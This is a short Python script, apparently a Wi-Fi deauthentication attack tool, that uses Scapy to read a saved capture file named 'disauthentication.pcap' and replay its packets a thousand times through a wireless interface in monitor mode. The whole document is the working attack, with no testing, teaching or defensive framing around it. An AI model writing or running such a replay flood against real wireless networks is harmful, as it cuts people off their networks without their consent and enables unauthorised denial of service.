from scapy.all import *

def resend_packet(pcap_file, interface):
    """
    Resend packets from a PCAP file.

    Args:
        pcap_file (str): Path to the PCAP file.
        interface (str): Wireless interface in monitor mode.
    """
    packets = rdpcap(pcap_file)  # Read packets from the PCAP file
    for x in range(1000):
        for i, packet in enumerate(packets):
            print(f"Sending packet #{i + 1}")
            sendp(packet, iface=interface, verbose=False)

# Example Usage
if __name__ == "__main__":
    pcap_file = "disauthentication.pcap"  # Path to your saved packet
    interface = "wlan1"                # Replace with your monitor mode interface
    resend_packet(pcap_file, interface)
